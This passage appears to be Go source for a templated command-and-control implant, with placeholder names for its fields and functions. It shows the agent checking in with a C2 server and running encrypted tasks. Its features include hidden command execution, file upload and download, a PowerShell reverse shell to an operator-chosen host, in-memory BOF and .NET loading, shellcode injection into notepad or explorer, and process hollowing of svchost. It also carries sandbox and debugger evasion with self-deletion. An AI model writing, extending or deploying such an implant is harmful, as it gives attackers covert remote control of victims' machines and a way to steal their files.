		{AGENT_USE_REDIRECTOR_FIELD}:        useRedirector,
		{AGENT_FAILOVER_URLS_FIELD}:         {FAILOVER_URLS},
		{AGENT_USE_FAILOVER_FIELD}:          {USE_FAILOVER},
		{AGENT_CURRENT_C2_URL_FIELD}:        c2URL,
		{AGENT_CURRENT_FAIL_COUNT_FIELD}:    0,
		{AGENT_MAX_FAIL_COUNT_FIELD}:        15,  // Try main C2 for ~15 * heartbeat_interval before failover
		{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}: time.Now(),
		{AGENT_IN_FAILOVER_ATTEMPT_FIELD}:   false,
	}

	return agent, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_ENCRYPT_DATA_FUNC}(data string) (string, error) {
	if a.{AGENT_SECRET_KEY_FIELD} == nil {
		return data, nil
	}

	encrypted, err := fernet.EncryptAndSign([]byte(data), a.{AGENT_SECRET_KEY_FIELD})
	if err != nil {
		return data, err
	}

	return base64.StdEncoding.EncodeToString(encrypted), nil  // Use standard base64 encoding for consistency
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_DECRYPT_DATA_FUNC}(encryptedData string) (string, error) {
	if a.{AGENT_SECRET_KEY_FIELD} == nil {
		return encryptedData, nil
	}

	// First try URL encoding (most common for Fernet tokens)
	decoded, err := base64.URLEncoding.DecodeString(encryptedData)
	if err != nil {
		// If URL encoding fails, try standard base64 encoding
		decoded, err = base64.StdEncoding.DecodeString(encryptedData)
		if err != nil {
			return encryptedData, err
		}
	}

	keys := []*fernet.Key{a.{AGENT_SECRET_KEY_FIELD}}
	decrypted := fernet.VerifyAndDecrypt(decoded, 0, keys) // 0 TTL means no expiration checking

	if decrypted == nil {
		return encryptedData, fmt.Errorf("failed to decrypt data")
	}

	return string(decrypted), nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SEND_FUNC}(method, uriTemplate string, data interface{}) (*{API_RESPONSE_STRUCT_NAME}, error) {
	uri := strings.Replace(uriTemplate, "{agent_id}", a.{AGENT_ID_FIELD}, -1)

	var url string
	if a.{AGENT_USE_REDIRECTOR_FIELD} {
		protocol := "http"
		if strings.HasPrefix(a.{AGENT_CURRENT_C2_URL_FIELD}, "https") {
			protocol = "https"
		}
		url = fmt.Sprintf("%s://%s:%d%s", protocol, a.{AGENT_REDIRECTOR_HOST_FIELD}, a.{AGENT_REDIRECTOR_PORT_FIELD}, uri)
	} else {
		url = a.{AGENT_CURRENT_C2_URL_FIELD} + uri
	}

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: false,  // Keep connections alive for efficiency
		MaxIdleConns: 10,
		IdleConnTimeout: 90 * time.Second,
	}
	client := &http.Client{Transport: tr, Timeout: 30 * time.Second}

	var req *http.Request
	var err error

	if data != nil {
		jsonData, err := json.Marshal(data)
		if err != nil {
			return nil, err
		}
		req, err = http.NewRequest(method, url, bytes.NewBuffer(jsonData))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/json")
	} else {
		req, err = http.NewRequest(method, url, nil)
		if err != nil {
			return nil, err
		}
	}

	for key, value := range a.{AGENT_HEADERS_FIELD} {
		req.Header.Set(key, value)
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()


	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}


	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("HTTP error: %d", resp.StatusCode)
	}

	var apiResp {API_RESPONSE_STRUCT_NAME}
	err = json.Unmarshal(body, &apiResp)
	if err != nil {
		return nil, err
	}

	return &apiResp, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_REGISTER_FUNC}() error {
	if !a.{AGENT_DISABLE_SANDBOX_FIELD} {
		if a.{AGENT_CHECK_SANDBOX_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return fmt.Errorf("sandbox detected, agent self-deleting")
		}

		if a.{AGENT_CHECK_DEBUGGERS_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return fmt.Errorf("debugger detected, agent self-deleting")
		}
	}

	data := map[string]interface{}{
		"agent_id":         a.{AGENT_ID_FIELD},
		"hostname":         a.{AGENT_HOSTNAME_FIELD},
		"os_info":          a.{AGENT_OSINFO_FIELD},
		"user":             a.{AGENT_USERNAME_FIELD},
		"listener_id":      "web_app_default", // This should match the listener name
		"interactive_capable": true,
		"secret_key":       a.{AGENT_SECRET_KEY_FIELD},
	}

	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_REGISTER_URI_FIELD}, data)
	if err != nil {
		return err
	}

	if resp.Status == "success" {
		if resp.Interval != 0 {
			a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = resp.Interval
		}
		if resp.Jitter != 0 {
			a.{AGENT_JITTER_FIELD} = resp.Jitter
		}
		return nil
	}

	return fmt.Errorf("registration failed: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_TASKS_FUNC}() ([]{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_TASKS_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" {
		tasks := resp.Tasks
		for i := range tasks {
			if a.{AGENT_SECRET_KEY_FIELD} != nil {
				decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(tasks[i].{TASK_COMMAND_FIELD})
				if err == nil {
					tasks[i].{TASK_COMMAND_FIELD} = decryptedCmd
				} else {
				}
			} else {
			}
		}
		return tasks, nil
	}

	return nil, fmt.Errorf("failed to get tasks: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_INTERACTIVE_STATUS_FUNC}() (bool, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_STATUS_URI_FIELD}, nil)
	if err != nil {
		return false, err
	}

	if resp.Status == "success" {
		return resp.InteractiveMode, nil
	}

	return false, fmt.Errorf("failed to check interactive status: %s", resp.Status)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_INTERACTIVE_COMMAND_FUNC}() (*{TASK_STRUCT_NAME}, error) {
	resp, err := a.{AGENT_SEND_FUNC}("GET", a.{AGENT_INTERACTIVE_URI_FIELD}, nil)
	if err != nil {
		return nil, err
	}

	if resp.Status == "success" && resp.Command != "" {
		taskID, err := strconv.ParseInt(resp.TaskID, 10, 64)
		if err != nil {
			taskID = 0 // Default to 0 if parsing fails
		}

		task := &{TASK_STRUCT_NAME}{
			{TASK_ID_FIELD}:      taskID,
			{TASK_COMMAND_FIELD}: resp.Command,
		}

		if a.{AGENT_SECRET_KEY_FIELD} != nil {
			decryptedCmd, err := a.{AGENT_DECRYPT_DATA_FUNC}(task.{TASK_COMMAND_FIELD})
			if err == nil {
				task.{TASK_COMMAND_FIELD} = decryptedCmd
			}
		}

		return task, nil
	}

	return nil, nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	_, err = a.{AGENT_SEND_FUNC}("POST", a.{AGENT_INTERACTIVE_URI_FIELD}, data)
	return err
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_EXECUTE_FUNC}(command string) string {




	// Use the hidden command execution function for Windows to prevent any console window flickering
	result, err := executeCommandHidden(command)
	if err != nil {
		return fmt.Sprintf("[ERROR] Command execution failed: %v", err)
	}
	return result
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SUBMIT_TASK_RESULT_FUNC}(taskID, result string) error {
	var encryptedResult string
	var err error
	if a.{AGENT_SECRET_KEY_FIELD} != nil {
		encryptedResult, err = a.{AGENT_ENCRYPT_DATA_FUNC}(result)
		if err != nil {
			encryptedResult = result
		} else {
		}
	} else {
		encryptedResult = result
	}

	data := {TASK_RESULT_STRUCT_NAME}{
		{TASK_RESULT_TASK_ID_FIELD}: taskID,
		{TASK_RESULT_RESULT_FIELD}: encryptedResult,
	}

	resp, err := a.{AGENT_SEND_FUNC}("POST", a.{AGENT_RESULTS_URI_FIELD}, data)
	if err != nil {
		return err
	} else {
		if resp != nil {
		}
	}
	return nil
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_MODULE_FUNC}(encodedScript string) string {
	decodedScript, err := base64.StdEncoding.DecodeString(encodedScript)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to decode module: %v", err)
	}

	return a.{AGENT_EXECUTE_FUNC}(string(decodedScript))
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_UPLOAD_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3)
	if len(parts) != 3 {
		return "[ERROR] Invalid upload command format."
	}

	remotePath := parts[1]
	encodedData := parts[2]

	decodedData, err := base64.StdEncoding.DecodeString(encodedData)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to decode file content: %v", err)
	}

	err = ioutil.WriteFile(remotePath, decodedData, 0644)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to write file: %v", err)
	}

	return fmt.Sprintf("[SUCCESS] File uploaded to %s", remotePath)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOWNLOAD_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		return "[ERROR] Invalid download command format."
	}

	remotePath := parts[1]

	if _, err := os.Stat(remotePath); os.IsNotExist(err) {
		return fmt.Sprintf("[ERROR] File not found on remote machine: %s", remotePath)
	}

	fileContent, err := ioutil.ReadFile(remotePath)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to read file: %v", err)
	}

	encodedContent := base64.StdEncoding.EncodeToString(fileContent)
	return encodedContent
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_TTY_SHELL_FUNC}(command string) string {
	parts := strings.Split(command, " ")
	var host string
	var port string

	if len(parts) >= 3 {
		host = parts[1]
		port = parts[2]
	} else {
		host = "127.0.0.1"
		port = "5000"
	}

	go func() {
		address := fmt.Sprintf("%s:%s", host, port)

		conn, err := net.Dial("tcp", address)
		if err != nil {
			return
		}
		defer conn.Close()

		// Only support PowerShell on Windows
		cmd := exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-NoProfile", "-Command", "-")

		stdin, err := cmd.StdinPipe()
		if err != nil {
			return
		}
		stdout, err := cmd.StdoutPipe()
		if err != nil {
			return
		}
		stderr, err := cmd.StderrPipe()
		if err != nil {
			return
		}

		if err := cmd.Start(); err != nil {
			return
		}

		go func() {
			_, _ = io.Copy(conn, stdout)
		}()

		go func() {
			_, _ = io.Copy(conn, stderr)
		}()

		go func() {
			_, _ = io.Copy(stdin, conn)
		}()

		cmd.Wait()
	}()

	return fmt.Sprintf("[SUCCESS] TTY shell connection initiated to %s:%s", host, port)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_SLEEP_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 2)
	if len(parts) != 2 {
		return "[ERROR] Invalid sleep command format. Usage: sleep <seconds>"
	}

	newSleep, err := strconv.Atoi(parts[1])
	if err != nil {
		return "[ERROR] Sleep interval must be a valid integer"
	}

	if newSleep <= 0 {
		return "[ERROR] Sleep interval must be a positive integer"
	}

	a.{AGENT_HEARTBEAT_INTERVAL_FIELD} = newSleep
	return fmt.Sprintf("[SUCCESS] Sleep interval changed to %d seconds", newSleep)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_BOF_FUNC}(command string) string {
	parts := strings.SplitN(command, " ", 3) // Split into at most 3 parts: ['bof', 'encoded_bof', 'args']
	if len(parts) < 2 {
		return "[ERROR] Invalid BOF command format. Usage: bof <base64_encoded_bof> [args...]"
	}

	encodedBOF := parts[1]
	bofArgs := ""
	if len(parts) > 2 {
		bofArgs = parts[2]
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(encodedBOF)
	if err != nil {
		return fmt.Sprintf("[ERROR] Invalid BOF data format: %v", err)
	}

	// Parse and prepare BOF arguments using lighthouse module
	var args []string
	if bofArgs != "" {
		argParts := strings.Fields(bofArgs)
		// Common types: 'z' for null-terminated strings, 'i' for integers, etc.
		for _, argPart := range argParts {
			args = append(args, "z"+argPart) // Default to null-terminated string
		}
	}

	// Pack the arguments using lighthouse
	argBytes := []byte{}
	if len(args) > 0 {
		argBytes, err = lighthouse.PackArgs(args)
		if err != nil {
			return fmt.Sprintf("[ERROR] Failed to pack BOF arguments: %v", err)
		}
	}

	// Execute the BOF in-memory using goffloader
	output, err := coff.Load(bofBytes, argBytes)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to execute BOF: %v", err)
	}

	if output == "" {
		return "[SUCCESS] BOF executed with no output"
	}

	return output
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command string) string {

	parts := strings.SplitN(command, " ", 2)
	if len(parts) < 2 {
		return "[ERROR] Invalid assembly command format. Usage: assembly <base64_encoded_assembly>"
	}

	encodedAssembly := parts[1]

	assemblyBytes, err := base64.StdEncoding.DecodeString(encodedAssembly)
	if err != nil {
		return fmt.Sprintf("[ERROR] Invalid assembly data format: %v", err)
	}

	// Load the CLR runtime first
	rtHost, err := clr.LoadCLR("v4")
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to load CLR: %v", err)
	}

	// Redirect stdout/stderr to capture output from the .NET assembly
	err = clr.RedirectStdoutStderr()
	if err != nil {
		// Continue execution even if redirect fails, just log the error
	}

	// Load and execute the assembly using LoadAssembly/InvokeAssembly approach
	assembly, err := clr.LoadAssembly(rtHost, assemblyBytes)
	if err != nil {
		rtHost.Release()
		return fmt.Sprintf("[ERROR] Failed to load assembly: %v", err)
	}

	// Execute the assembly
	stdout, stderr := clr.InvokeAssembly(assembly, []string{})

	// Release resources
	assembly.Release()
	rtHost.Release()

	// Return the output
	output := stdout
	if stderr != "" {
		if output != "" {
			output += "\n"
		}
		output += "[STDERR] " + stderr
	}

	if output == "" {
		return "[SUCCESS] .NET assembly executed with no output"
	}

	return output
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_GET_PROCESS_ID_FUNC}(processName string) (uint32, error) {
	// Find process ID for the specified process name (Windows only)
	// Convert process name to lowercase for comparison
	processName = strings.ToLower(processName)

	// Create a snapshot of all processes in the system
	snapshot := createToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
	if snapshot == 0 {
		return 0, fmt.Errorf("failed to create process snapshot")
	}
	defer func() {
		syscall.CloseHandle(syscall.Handle(snapshot))
	}()

	// Initialize the PROCESSENTRY32 structure
	var pe PROCESSENTRY32
	pe.Size = uint32(unsafe.Sizeof(pe))

	// Get the first process
	if !process32First(snapshot, &pe) {
		return 0, fmt.Errorf("failed to get first process")
	}

	// Iterate through all processes
	for {
		// Convert the wide string to a regular string for comparison
		exeName := syscall.UTF16ToString(pe.ExeFile[:])
		if strings.ToLower(exeName) == processName || strings.ToLower(strings.TrimSuffix(exeName, ".exe")) == processName {
			return pe.ProcessID, nil
		}

		// Get the next process
		if !process32Next(snapshot, &pe) {
			break
		}
	}

	return 0, fmt.Errorf("process %s not found", processName)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_SHELLCODE_FUNC}(shellcode []byte) string {

	// Get target process ID (try notepad.exe first, then explorer.exe as fallback)
	pid, err := a.{AGENT_GET_PROCESS_ID_FUNC}("notepad.exe")
	targetProcess := "notepad.exe"

	if err != nil {
		// If notepad.exe is not available, try explorer.exe
		pid, err = a.{AGENT_GET_PROCESS_ID_FUNC}("explorer.exe")
		if err != nil {
			return fmt.Sprintf("[ERROR] Could not find notepad.exe or explorer.exe: %v", err)
		}
		targetProcess = "explorer.exe"
	}

	// Open the target process with all necessary permissions
	processHandle := openProcess(PROCESS_ALL_ACCESS, 0, pid)
	if processHandle == 0 {
		return "[ERROR] Failed to open target process"
	}

	// Allocate memory in the target process
	allocAddress := virtualAllocEx(processHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
	if allocAddress == 0 {
		return "[ERROR] Failed to allocate memory in target process"
	}

	// Write shellcode to the allocated memory
	var bytesWritten uintptr
	success := writeProcessMemory(processHandle, allocAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), &bytesWritten)
	if !success {
		return "[ERROR] Failed to write shellcode to target process memory"
	}

	// Change memory protection to executable
	var oldProtect uint32
	success = virtualProtectEx(processHandle, allocAddress, uintptr(len(shellcode)), PAGE_EXECUTE_READWRITE, &oldProtect)
	if !success {
		return "[ERROR] Failed to change memory protection in target process"
	}

	// Create remote thread to execute shellcode
	var threadID uint32
	threadHandle := createRemoteThread(processHandle, 0, 0, allocAddress, 0, 0, &threadID)
	if threadHandle == 0 {
		return "[ERROR] Failed to create remote thread in target process"
	}

	return fmt.Sprintf("[SUCCESS] Shellcode injected into %s (PID: %d), thread ID: %d", targetProcess, pid, threadID)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INJECT_PE_FUNC}(peData []byte) string {

	if len(peData) < 1024 { // Minimum size check
		return "[ERROR] PE file too small to be valid"
	}

	// Parse the PE file to extract necessary information
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(&peData[0]))
	if dosHeader.E_magic != IMAGE_DOS_SIGNATURE {
		return "[ERROR] Invalid DOS signature"
	}

	ntHeadersOffset := dosHeader.E_lfanew
	if int(ntHeadersOffset) >= len(peData) || ntHeadersOffset < 0 {
		return "[ERROR] Invalid NT headers offset"
	}

	// Add bounds checking for NT signature
	if int(ntHeadersOffset) + 4 > len(peData) {
		return "[ERROR] NT headers offset beyond data bounds"
	}

	ntSignature := *(*uint32)(unsafe.Pointer(&peData[ntHeadersOffset]))
	if ntSignature != IMAGE_NT_SIGNATURE {
		return "[ERROR] Invalid NT signature"
	}

	// Parse NT headers based on architecture
	if int(ntHeadersOffset) + 4 + int(unsafe.Sizeof(IMAGE_FILE_HEADER{})) >= len(peData) {
		return "[ERROR] PE data too small for NT headers"
	}

	fileHeader := (*IMAGE_FILE_HEADER)(unsafe.Pointer(&peData[ntHeadersOffset+4]))

	var imageBase uint64
	var entryPoint uint32
	var imageSize uint32

	if fileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 {
		headerOffset := ntHeadersOffset + int32(4) + int32(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
		if int(headerOffset) + int(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER64{})) >= len(peData) {
			return "[ERROR] PE data too small for x64 optional header"
		}
		optionalHeader := (*IMAGE_OPTIONAL_HEADER64)(unsafe.Pointer(&peData[headerOffset]))
		imageBase = optionalHeader.ImageBase
		entryPoint = optionalHeader.AddressOfEntryPoint
		imageSize = optionalHeader.SizeOfImage
	} else if fileHeader.Machine == IMAGE_FILE_MACHINE_I386 {
		headerOffset := ntHeadersOffset + int32(4) + int32(unsafe.Sizeof(IMAGE_FILE_HEADER{}))
		if int(headerOffset) + int(unsafe.Sizeof(IMAGE_OPTIONAL_HEADER32{})) >= len(peData) {
			return "[ERROR] PE data too small for x86 optional header"
		}
		optionalHeader := (*IMAGE_OPTIONAL_HEADER32)(unsafe.Pointer(&peData[headerOffset]))
		imageBase = uint64(optionalHeader.ImageBase)
		entryPoint = optionalHeader.AddressOfEntryPoint
		imageSize = optionalHeader.SizeOfImage
	} else {
		return "[ERROR] Unsupported architecture"
	}

	// Create target process in suspended state
	targetPath, _ := syscall.UTF16PtrFromString("C:\\Windows\\System32\\svchost.exe")
	var si STARTUPINFO
	var pi PROCESS_INFORMATION
	si.Cb = uint32(unsafe.Sizeof(si))
	si.Flags = 0x1        // STARTF_USESHOWWINDOW
	si.ShowWindow = 0     // SW_HIDE (hidden)

	// Command line needed for svchost.exe to work properly
	cmdLine, _ := syscall.UTF16PtrFromString("svchost.exe -k netsvcs -s BITS")

	err := createProcess(
		targetPath, // Path to target process
		cmdLine,    // Command line (needed for svchost.exe)
		nil,        // Process attributes
		nil,        // Thread attributes
		false,      // Inherit handles
		0x4,        // CREATE_SUSPENDED flag
		0,          // Environment
		nil,        // Current directory
		&si,        // Startup info
		&pi,        // Process information
	)

	// If svchost.exe fails, fallback to explorer.exe
	if err != nil {
		targetPath, _ = syscall.UTF16PtrFromString("C:\\Windows\\explorer.exe")
		cmdLine, _ = syscall.UTF16PtrFromString("explorer.exe")
		err = createProcess(
			targetPath,
			cmdLine,
			nil,
			nil,
			false,
			0x4,
			0,
			nil,
			&si,
			&pi,
		)

		if err != nil {
			return fmt.Sprintf("[ERROR] Failed to create suspended target process (svchost.exe or explorer.exe): %v", err)
		}
	}

	// Unmap the target process memory
	result := ntUnmapViewOfSection(pi.Process, uintptr(imageBase))
	if result != 0 {
		// Continue execution anyway as this might not be critical
	}

	// Allocate memory in the target process for the PE file
	allocAddr := virtualAllocEx(pi.Process, uintptr(imageBase), uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if allocAddr == 0 {
		// Try without specifying base address
		allocAddr = virtualAllocEx(pi.Process, 0, uintptr(imageSize), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
		if allocAddr == 0 {
			return "[ERROR] Failed to allocate memory in target process"
		}
	} else {
	}

	// Write the PE headers to the allocated memory
	var bytesWritten uintptr
	success := writeProcessMemory(pi.Process, allocAddr, uintptr(unsafe.Pointer(&peData[0])), uintptr(len(peData)), &bytesWritten)
	if !success {
		return "[ERROR] Failed to write PE headers to target process memory"
	}

	// Get the current thread context
	var context CONTEXT
	context.ContextFlags = 0x00000001 | 0x00000002 | 0x00000010 // CONTEXT_CONTROL | CONTEXT_INTEGER
	err = getThreadContext(pi.Thread, &context)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to get thread context: %v", err)
	}

	// Update the entry point in the context
	newEntryPoint := allocAddr + uintptr(entryPoint)
	context.Rip = uint64(newEntryPoint) // For x64, update the instruction pointer

	// Set the updated context
	err = setThreadContext(pi.Thread, &context)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to set thread context: %v", err)
	}

	// Resume the target process thread
	_, err = resumeThread(pi.Thread)
	if err != nil {
		return fmt.Sprintf("[ERROR] Failed to resume target process thread: %v", err)
	}

	return fmt.Sprintf("[SUCCESS] PE file injected and executed in process PID: %d, TID: %d", pi.ProcessId, pi.ThreadId)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_PROCESS_COMMAND_FUNC}(command string) string {

	if strings.HasPrefix(command, "module ") {
		encodedScript := command[7:] // Remove "module " prefix
		result := a.{AGENT_HANDLE_MODULE_FUNC}(encodedScript)
		return result
	} else if strings.HasPrefix(command, "upload ") {
		result := a.{AGENT_HANDLE_UPLOAD_FUNC}(command)
		return result
	} else if strings.HasPrefix(command, "download ") {
		result := a.{AGENT_HANDLE_DOWNLOAD_FUNC}(command)
		return result
	} else if strings.HasPrefix(command, "tty_shell") {
		result := a.{AGENT_HANDLE_TTY_SHELL_FUNC}(command)
		return result
	} else if strings.HasPrefix(command, "sleep ") {
		result := a.{AGENT_HANDLE_SLEEP_FUNC}(command)
		return result
	} else if strings.HasPrefix(command, "bof ") {
		result := a.{AGENT_HANDLE_BOF_FUNC}(command)
		return result
	} else if strings.HasPrefix(command, "assembly ") {
		result := a.{AGENT_HANDLE_DOTNET_ASSEMBLY_FUNC}(command)
		return result
	} else if strings.HasPrefix(command, "shellcode ") {
		// Handle shellcode injection command
		encodedShellcode := command[10:] // Remove "shellcode " prefix
		shellcodeData, err := base64.StdEncoding.DecodeString(encodedShellcode)
		if err != nil {
			return fmt.Sprintf("[ERROR] Invalid shellcode data format: %v", err)
		}
		result := a.{AGENT_INJECT_SHELLCODE_FUNC}(shellcodeData)
		return result
	} else if strings.HasPrefix(command, "peinject ") {
		// Handle PE injection command - check for 'pe' prefix
		encodedPE := command[9:] // Remove "peinject " prefix
		if len(encodedPE) < 2 || !strings.HasPrefix(encodedPE, "pe") {
			return "[ERROR] PE injection command must start with 'pe' prefix"
		}
		encodedData := encodedPE[2:] // Remove "pe" prefix
		peData, err := base64.StdEncoding.DecodeString(encodedData)
		if err != nil {
			return fmt.Sprintf("[ERROR] Invalid PE data format: %v", err)
		}
		result := a.{AGENT_INJECT_PE_FUNC}(peData)
		return result
	} else if command == "kill" {
		a.{AGENT_SELF_DELETE_FUNC}()
		return "[SUCCESS] Agent killed"
	} else {
		result := a.{AGENT_EXECUTE_FUNC}(command)
		return result
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_RUN_FUNC}() {

	for {
		// Check kill date first
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			a.{AGENT_RESET_FAIL_COUNT_FUNC}()
			break
		} else {
			// Don't print anything for stealth - increment fail count only if not in failover attempt
			if !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
			}
		}
		time.Sleep(30 * time.Second)
	}

	a.{AGENT_RUNNING_FIELD} = true
	checkCount := 0

	for a.{AGENT_RUNNING_FIELD} {
		// Check kill date on each iteration
		if a.{AGENT_CHECK_KILL_DATE_FUNC}() {
			a.{AGENT_SELF_DELETE_FUNC}()
			return
		}

		// Check if we're outside working hours
		if !a.{AGENT_CHECK_WORKING_HOURS_FUNC}() {
			// Sleep for 5 minutes and check again
			time.Sleep(5 * time.Minute)
			continue
		}

		checkCount++

		if checkCount%3 == 0 {
			shouldBeInteractive, err := a.{AGENT_CHECK_INTERACTIVE_STATUS_FUNC}()
			if err == nil {
				if shouldBeInteractive && !a.{AGENT_INTERACTIVE_MODE_FIELD} {
					a.{AGENT_INTERACTIVE_MODE_FIELD} = true
				} else if !shouldBeInteractive && a.{AGENT_INTERACTIVE_MODE_FIELD} {
					a.{AGENT_INTERACTIVE_MODE_FIELD} = false
				}
			} else {
				// Failed to check interactive status, but don't print anything for stealth
				_ = err // Use the error variable to avoid unused variable warning
			}
		}

		if !a.{AGENT_INTERACTIVE_MODE_FIELD} {
			tasks, err := a.{AGENT_GET_TASKS_FUNC}()
			if err != nil {
				// Failed to get tasks, but don't print anything for stealth
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				time.Sleep(30 * time.Second)
				continue
			} else {
				a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful communication
			}


			for _, task := range tasks {
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(task.{TASK_COMMAND_FIELD})
				taskIDStr := strconv.FormatInt(task.{TASK_ID_FIELD}, 10)
				err := a.{AGENT_SUBMIT_TASK_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// Failed to submit task result, but don't print anything for stealth
					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				} else {
					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
				}
			}
		} else {
			interactiveTask, err := a.{AGENT_GET_INTERACTIVE_COMMAND_FUNC}()
			if err != nil {
				// Failed to get interactive command, but don't print anything for stealth
				a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
			} else if interactiveTask != nil {
				result := a.{AGENT_PROCESS_COMMAND_FUNC}(interactiveTask.{TASK_COMMAND_FIELD})
				taskIDStr := strconv.FormatInt(interactiveTask.{TASK_ID_FIELD}, 10)
				err := a.{AGENT_SUBMIT_INTERACTIVE_RESULT_FUNC}(taskIDStr, result)
				if err != nil {
					// Failed to submit interactive result, but don't print anything for stealth
					a.{AGENT_INCREMENT_FAIL_COUNT_FUNC}()
				} else {
					a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset on successful result submission
				}
			} else {
				a.{AGENT_RESET_FAIL_COUNT_FUNC}()  // Reset when no task but no error
			}
		}

		baseSleep := float64(a.{AGENT_HEARTBEAT_INTERVAL_FIELD})
		jitterFactor := (rand.Float64() - 0.5) * 2 * a.{AGENT_JITTER_FIELD}
		sleepTime := baseSleep * (1 + jitterFactor)
		if sleepTime < 5 {
			sleepTime = 5
		}

		time.Sleep(time.Duration(sleepTime) * time.Second)
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_STOP_FUNC}() {
	a.{AGENT_RUNNING_FIELD} = false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_SANDBOX_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cpuCount := runtime.NumCPU()
	if cpuCount < 2 {
		return true
	}

	var totalRAM uint64
	// Windows-specific sandbox checks
	if os.Getenv("VBOX_SHARED_FOLDERS") != "" ||
	   os.Getenv("VBOX_SESSION") != "" ||
	   strings.Contains(os.Getenv("COMPUTERNAME"), "SANDBOX") ||
	   strings.Contains(os.Getenv("COMPUTERNAME"), "SND") {
		return true
	}

	if totalRAM > 0 && totalRAM < 2*1024*1024*1024 { // Less than 2GB
		return true
	}

	hostname, _ := os.Hostname()
	hostnameLower := strings.ToLower(hostname)
	sandboxIndicators := []string{
		"sandbox", "malware", "detected", "test",
		"cuckoo", "malbox", "innotek",
		"virtual", "vmware", "vbox", "xen",
	}
	for _, indicator := range sandboxIndicators {
		if strings.Contains(hostnameLower, indicator) {
